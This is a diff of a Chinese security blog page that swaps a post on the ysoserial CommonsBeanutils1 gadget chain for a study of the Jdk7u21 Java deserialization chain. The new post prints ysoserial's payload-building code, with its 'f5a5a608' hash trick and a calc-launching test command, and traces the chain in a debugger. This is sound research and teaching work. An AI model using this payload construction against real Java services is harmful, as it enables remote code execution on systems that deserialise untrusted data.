@@ -6,27 +6,46 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>ysoserial学习之CommonsBeanutils1 | huahua&#39;s Blog</title>
+  <title>ysoserial学习之Jdk7u21 | huahua&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言CommonCollections系列的gadgets我们在反序列化利用中用的很多，下面剖析一下ysoserial中CommonsBeanutils1的调用链和原理。 实验环境:jdk1.8.0_211、commons-beanutils:commons-beanutils:1.9.2、commons-collections:commons-collections:3.1、commons-lo">
+  <meta name="description" content="前言由于最近h.v.v期间爆出了weblogic关于jdk7u21的绕过，因此准备学习一下这个链。 实验环境:jdk7u17、ysoserial源码">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ysoserial学习之CommonsBeanutils1">
-<meta property="og:url" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/index.html">
+<meta property="og:title" content="ysoserial学习之Jdk7u21">
+<meta property="og:url" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/index.html">
 <meta property="og:site_name" content="huahua&#39;s Blog">
-<meta property="og:description" content="前言CommonCollections系列的gadgets我们在反序列化利用中用的很多，下面剖析一下ysoserial中CommonsBeanutils1的调用链和原理。 实验环境:jdk1.8.0_211、commons-beanutils:commons-beanutils:1.9.2、commons-collections:commons-collections:3.1、commons-lo">
+<meta property="og:description" content="前言由于最近h.v.v期间爆出了weblogic关于jdk7u21的绕过，因此准备学习一下这个链。 实验环境:jdk7u17、ysoserial源码">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/image-20201026152634673.png">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/image-20201026152712137.png">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/image-20201026152723266.png">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/image-20201026152829008.png">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/image-20201026153428769.png">
-<meta property="og:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/image-20201026154618868.png">
-<meta property="article:published_time" content="2021-05-01T08:21:32.000Z">
-<meta property="article:modified_time" content="2021-05-01T08:22:14.894Z">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502121738266.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502121936935.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502122223514.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502122904343.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502123024021.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502123059492.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502123254810.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502123607527.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502123718658.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502124521574.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502124920641.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502125000783.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502142946807.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502143331710.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502143401375.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502144016101.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502144058044.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502144153736.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502144411419.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502144522149.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502144654546.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502144911219.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502145112309.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502145217344.png">
+<meta property="og:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502145237043.png">
+<meta property="article:published_time" content="2021-05-02T04:09:20.000Z">
+<meta property="article:modified_time" content="2021-05-02T07:00:48.635Z">
 <meta property="article:author" content="huahua">
 <meta property="article:tag" content="ysoserial学习">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/image-20201026152634673.png">
+<meta name="twitter:image" content="http://example.com/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502121738266.png">
   
     <link rel="alternative" href="/atom.xml" title="huahua&#39;s Blog" type="application/atom+xml">
   
@@ -162,59 +181,94 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-ysoserial学习之CommonsBeanutils1" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-ysoserial学习之Jdk7u21" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      ysoserial学习之CommonsBeanutils1
+      ysoserial学习之Jdk7u21
     </h1>
   
 
         
-        <a href="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/" class="archive-article-date">
-  	<time datetime="2021-05-01T08:21:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-01</time>
+        <a href="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/" class="archive-article-date">
+  	<time datetime="2021-05-02T04:09:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-02</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>CommonCollections系列的gadgets我们在反序列化利用中用的很多，下面剖析一下ysoserial中CommonsBeanutils1的调用链和原理。</p>
-<p>实验环境:jdk1.8.0_211、commons-beanutils:commons-beanutils:1.9.2、commons-collections:commons-collections:3.1、commons-logging:commons-logging:1.2</p>
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于最近h.v.v期间爆出了weblogic关于jdk7u21的绕过，因此准备学习一下这个链。</p>
+<p>实验环境:jdk7u17、ysoserial源码</p>
 <span id="more"></span>
 
-<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>关键调用链</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses</span><br><span class="line">	  at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance</span><br><span class="line">	  at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer</span><br><span class="line">	  at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties</span><br><span class="line">	  at java.lang.reflect.Method.invoke</span><br><span class="line">	  at org.apache.commons.beanutils.PropertyUtilsBean.invokeMethod</span><br><span class="line">	  at org.apache.commons.beanutils.PropertyUtilsBean.getSimpleProperty</span><br><span class="line">	  at org.apache.commons.beanutils.PropertyUtilsBean.getNestedProperty</span><br><span class="line">	  at org.apache.commons.beanutils.PropertyUtilsBean.getProperty</span><br><span class="line">	  at org.apache.commons.beanutils.PropertyUtils.getProperty</span><br><span class="line">	  at org.apache.commons.beanutils.BeanComparator.compare</span><br><span class="line">	  at java.util.PriorityQueue.siftDownUsingComparator</span><br><span class="line">	  at java.util.PriorityQueue.siftDown</span><br><span class="line">	  at java.util.PriorityQueue.heapify</span><br><span class="line">	  at java.util.PriorityQueue.readObject</span><br></pre></td></tr></table></figure>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>首先创建一个类，模拟使用jdk7u21进行序列化和反序列化的过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class jdk17Gadgat &#123;</span><br><span class="line">    public static void main(String args[]) throws Exception &#123;</span><br><span class="line">        Jdk7u21 jdk7u21&#x3D;new Jdk7u21();</span><br><span class="line">        Object jdk7u21Object &#x3D;jdk7u21.getObject(&quot;cmd.exe &#x2F;c calc&quot;);</span><br><span class="line">        FileOutputStream fileOutputStream&#x3D;new FileOutputStream(new File(&quot;out&quot;));</span><br><span class="line">        ObjectOutputStream objectOutputStream&#x3D;new ObjectOutputStream(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(jdk7u21Object);</span><br><span class="line"></span><br><span class="line">        FileInputStream fileInputStream&#x3D;new FileInputStream(new File(&quot;out&quot;));</span><br><span class="line">        ObjectInputStream objectInputStream&#x3D;new ObjectInputStream(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>调用链复制了到TemplatesImpl.defineTransletClasses部分，再后面的部分之前在CommonCollections的调用链中分析过了，在这里是一样得。</p>
-<p>入口是熟悉的PriorityQueue.readObject，改变的只是PriorityQueue实体类中comparator参数的值，之前cc链中使用的是TransformingComparator，在CommonsBeanutils中改成了BeanComparator。接下来使用断点调试看BeanComparator.compare做了什么工作。</p>
-<p>断点直接打在com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses中，然后顺着堆栈看不清楚的方法操作。</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/image-20201026152634673.png">调用了PropertyUtils.getProperty(01,this.property)</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/image-20201026152712137.png"></p>
-<p>跟入</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/image-20201026152723266.png"></p>
-<p>继续跟入</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/image-20201026152829008.png"></p>
-<p>调用了this.getSimpleProperty(bean, name)，跟入方法</p>
-<p>贴出该方法全部代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public Object getSimpleProperty(Object bean, String name) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123;</span><br><span class="line">       if (bean &#x3D;&#x3D; null) &#123;</span><br><span class="line">           throw new IllegalArgumentException(&quot;No bean specified&quot;);</span><br><span class="line">       &#125; else if (name &#x3D;&#x3D; null) &#123;</span><br><span class="line">           throw new IllegalArgumentException(&quot;No name specified for bean class &#39;&quot; + bean.getClass() + &quot;&#39;&quot;);</span><br><span class="line">       &#125; else if (this.resolver.hasNested(name)) &#123;</span><br><span class="line">           throw new IllegalArgumentException(&quot;Nested property names are not allowed: Property &#39;&quot; + name + &quot;&#39; on bean class &#39;&quot; + bean.getClass() + &quot;&#39;&quot;);</span><br><span class="line">       &#125; else if (this.resolver.isIndexed(name)) &#123;</span><br><span class="line">           throw new IllegalArgumentException(&quot;Indexed property names are not allowed: Property &#39;&quot; + name + &quot;&#39; on bean class &#39;&quot; + bean.getClass() + &quot;&#39;&quot;);</span><br><span class="line">       &#125; else if (this.resolver.isMapped(name)) &#123;</span><br><span class="line">           throw new IllegalArgumentException(&quot;Mapped property names are not allowed: Property &#39;&quot; + name + &quot;&#39; on bean class &#39;&quot; + bean.getClass() + &quot;&#39;&quot;);</span><br><span class="line">       &#125; else if (bean instanceof DynaBean) &#123;</span><br><span class="line">           DynaProperty descriptor &#x3D; ((DynaBean)bean).getDynaClass().getDynaProperty(name);</span><br><span class="line">           if (descriptor &#x3D;&#x3D; null) &#123;</span><br><span class="line">               throw new NoSuchMethodException(&quot;Unknown property &#39;&quot; + name + &quot;&#39; on dynaclass &#39;&quot; + ((DynaBean)bean).getDynaClass() + &quot;&#39;&quot;);</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">               return ((DynaBean)bean).get(name);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           PropertyDescriptor descriptor &#x3D; this.getPropertyDescriptor(bean, name);   &#x2F;&#x2F;从这里开始及之后代码是关键</span><br><span class="line">           if (descriptor &#x3D;&#x3D; null) &#123;</span><br><span class="line">               throw new NoSuchMethodException(&quot;Unknown property &#39;&quot; + name + &quot;&#39; on class &#39;&quot; + bean.getClass() + &quot;&#39;&quot;);</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">               Method readMethod &#x3D; this.getReadMethod(bean.getClass(), descriptor);</span><br><span class="line">               if (readMethod &#x3D;&#x3D; null) &#123;</span><br><span class="line">                   throw new NoSuchMethodException(&quot;Property &#39;&quot; + name + &quot;&#39; has no getter method in class &#39;&quot; + bean.getClass() + &quot;&#39;&quot;);</span><br><span class="line">               &#125; else &#123;</span><br><span class="line">                   Object value &#x3D; this.invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY);                  &#x2F;&#x2F;下一步入口</span><br><span class="line">                   return value;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>关键的jdk7u21.getObject(final String command)方法如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public Object getObject(final String command) throws Exception &#123;</span><br><span class="line">		final Object templates &#x3D; Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">		String zeroHashCodeStr &#x3D; &quot;f5a5a608&quot;;</span><br><span class="line"></span><br><span class="line">		HashMap map &#x3D; new HashMap();</span><br><span class="line">		map.put(zeroHashCodeStr, &quot;foo&quot;);</span><br><span class="line"></span><br><span class="line">		InvocationHandler tempHandler &#x3D; (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">		Reflections.setFieldValue(tempHandler, &quot;type&quot;, Templates.class);</span><br><span class="line">		Templates proxy &#x3D; Gadgets.createProxy(tempHandler, Templates.class);</span><br><span class="line"></span><br><span class="line">		LinkedHashSet set &#x3D; new LinkedHashSet(); &#x2F;&#x2F; maintain order</span><br><span class="line">		set.add(templates);</span><br><span class="line">		set.add(proxy);</span><br><span class="line"></span><br><span class="line">		Reflections.setFieldValue(templates, &quot;_auxClasses&quot;, null);</span><br><span class="line">		Reflections.setFieldValue(templates, &quot;_class&quot;, null);</span><br><span class="line"></span><br><span class="line">		map.put(zeroHashCodeStr, templates); &#x2F;&#x2F; swap in real object</span><br><span class="line"></span><br><span class="line">		return set;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
 
-<p>从上面标注的关键部分开始读起</p>
-<p>首先获取了bean类的名为name的属性的PropertyDescriptor，如果descriptor为空抛出错误bean类中无该属性。若存在调用getReadMethod对bean和descriptor进行处理，从抛出异常来看，该方法是获取bean类中name属性的getter方法。接下来的this.invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY)从函数名来看，应该是反射调用了name属性的getter方法，具体还要跟进入看，跟入this.invokeMethod。</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/image-20201026153428769.png"></p>
-<p>果不其然直接反射调用了bean类钟name属性的getter方法，并且该方法的参数为EMPTY_OBJECT_ARRAY也就是new Object[]{}也就是无参的getter方法。</p>
-<p>而exp中填入的bean为填充了恶意代码的org.apache.xalan.xsltc.trax.TemplatesImpl，name为outputProperties，所以outputProperties的getter方法为getOutputProperties。getOutputProperties代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public synchronized Properties getOutputProperties() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        catch (TransformerConfigurationException e) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到最后还是调用了TemplatesImpl进行命令执行的，因此我们直接在com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中的newTransformer()方法中下断点</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502121738266.png" alt="image-20210502121738266"></p>
+<p>直接debug</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502121936935.png" alt="image-20210502121936935"></p>
+<p>顺着堆栈找之前的调用过程，看是如何一步步的到我们打到断点的那个语句的，只要走到我们打断点的那个语句，命令执行就等于成功了。找到Hashset的readObject的那条堆栈，发现是从map.put(方法进入的)。</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502122223514.png" alt="image-20210502122223514"></p>
+<p>此时的e，为javax.xml.transform.Templates的动态代理，而这个动态代理类的InvocationHandler的memberValues的值为f5a5a608 -&gt; {TemplatesImpl@761} </p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502122904343.png" alt="image-20210502122904343"></p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502123024021.png" alt="image-20210502123024021"></p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502123059492.png" alt="image-20210502123059492"></p>
+<p>接下来回到我们的map.put的下一步继续看</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502123254810.png" alt="image-20210502123254810"></p>
+<p>调用了key.equals，key即为上一步的e，调用proxy类型的任何方法，都会先调用其Invocation的invoke方法。</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502123607527.png" alt="image-20210502123607527"></p>
+<p>最后调用到euqalsImpl方法，在这个方法中，遍历所有AnnotationInvocationHandler.this.type.getDeclaredMethods()中的方法，然后逐个调用，最后调用到com.sun.org.apache.xalan.internal.xsltc.trax的newTransformer()方法，触发命令执行。</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502123718658.png" alt="image-20210502123718658"></p>
+<h4 id="关键点代码解析"><a href="#关键点代码解析" class="headerlink" title="关键点代码解析"></a>关键点代码解析</h4><p><strong>1、为什么Jdk7u21代码中map的key值要为f5a5a608？</strong></p>
+<p>经过我把f5a5a608这个字符串修改后发现，修改后就触发不了命令执行了。</p>
+<p>最关键的原因是如果修改字符串，则压根进入不了下图的for循环</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502124521574.png" alt="image-20210502124521574"></p>
+<p>这个问题的答案还与为什么Jdk7u21的代码中的HashSet中需要放入两个对象有关(如下图)</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502124920641.png" alt="image-20210502124920641"></p>
+<p>我们把断点下到下图位置，然后开启debug模式</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502125000783.png" alt="image-20210502125000783"></p>
+<p>可以看到，第一次反序列化得到的e为TemplatesImpl的类，对应的是Jdk7u21代码中的set.add(templates)。</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502142946807.png" alt="image-20210502142946807"></p>
+<p>进入put方法后，算得hash为578003213，其在table数组中得序列为13（每次运行hash和序列数都不同）。然后f9直接运行到下一次得map.put位置，此时得e为Proxy对象</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502143331710.png" alt="image-20210502143331710"></p>
+<p>f7跟入put方法中，如果i和上一波得到得i相同，那么table[i]就不为空，否则为空。因此我们大致可以判断，f5a5a608是为了让proxy对象得到得i和TemplatesImpl对象得到得到的i相同。</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502143401375.png" alt="image-20210502143401375"></p>
+<p>具体跟入hash(key)的逻辑</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502144016101.png" alt="image-20210502144016101"></p>
+<p>继续跟入k.hashCode()</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502144058044.png" alt="image-20210502144058044"></p>
+<p>跟入this.hashCodeImpl()，var2为this.memberValues这个hashmap中的迭代器。var3为f5a5a608 -&gt; {TemplatesImpl@761} </p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502144153736.png" alt="image-20210502144153736"></p>
+<p>最后的返回值为var1，而var1为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var1 +&#x3D; 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue()))</span><br></pre></td></tr></table></figure>
 
-<p>上面调用了我们乐意看到的org.apache.xalan.xsltc.trax.TemplatesImpl的newTransformer方法，触发了代码执行。</p>
-<p>而在于exp构造方面，作者也使用了一些技巧。</p>
-<p><strong>1、一开始BeanComparator的参数为什么是lowestSetBit，queue.add中的参数为什么是BigInteger类型?</strong></p>
-<p>首先我们知道在PriorityQueue的第二次add中会调用到PriorityQueue实体类的compare属性的compare函数造成提前触发，这个在<a target="_blank" rel="noopener" href="https://flowerwind.github.io/2020/10/25/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections4/">cc4解析</a>中说过。因此我们需要做的事情是让这个提前触发不会抛出异常，以让我们后面的代码还能继续执行。在执行BeanComparator的compare时会调用queueArray中内容的类的属性，属性名为BeanComparator的property参数，按照作者的写法最后会找到的BigInteger的lowestSetBit属性，并调用getLowestSetBit</p>
-<p><img src="/2021/05/01/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsBeanutils1/image-20201026154618868.png"></p>
-<p>我们可以看到getlowestSetBit是存在的因此不会报错，顺利的执行下去，而如果我们乱填的话，就会抛出异常，所以这里add的Biginteger和lowestSetBit作为参数都是有意义的，并不是随便写的。</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502144411419.png" alt="image-20210502144411419"></p>
+<p>首先计算(String)var3.getKey()).hashCode()</p>
+<p>f7跟入var3.getKey获取到var3.getKey==”f5a5a608”</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502144522149.png" alt="image-20210502144522149"></p>
+<p>然后跟入”f5a5a608”.hashCode()，也就是String类的hashCode方法，最后算得其hashCode为0</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502144654546.png" alt="image-20210502144654546"></p>
+<p>而var1得值为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue()))</span><br></pre></td></tr></table></figure>
+
+<p>(String)var3.getKey()).hashCode()为0，0与任何数异或都为任何数其本身</p>
+<p>而memberValueHashCode(var3.getValue)值为TemplateImpl.HashCode()，则var1得值为TemplateImpl.HashCode()</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502144911219.png" alt="image-20210502144911219"></p>
+<p>我们知道上一波得hash值就是为TemplateImpl.HashCode()，而这一波得hash值同样也是TemplateImpl.HashCode，所以其hash同样为578003213</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502145112309.png" alt="image-20210502145112309"></p>
+<p>hash不变，数组长度不变，所以序列也不变</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502145217344.png" alt="image-20210502145217344"></p>
+<p>因此顺利进入key.equals(k)和之前得分析接上了。而如果我们把“f5a5a608”这个字符串改了，那两波得hash会不同，就进不来for循环了。</p>
+<p><img src="/2021/05/02/ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BJdk7u21/image-20210502145237043.png" alt="image-20210502145237043"></p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>继续搞java，加油</p>
 
       
 
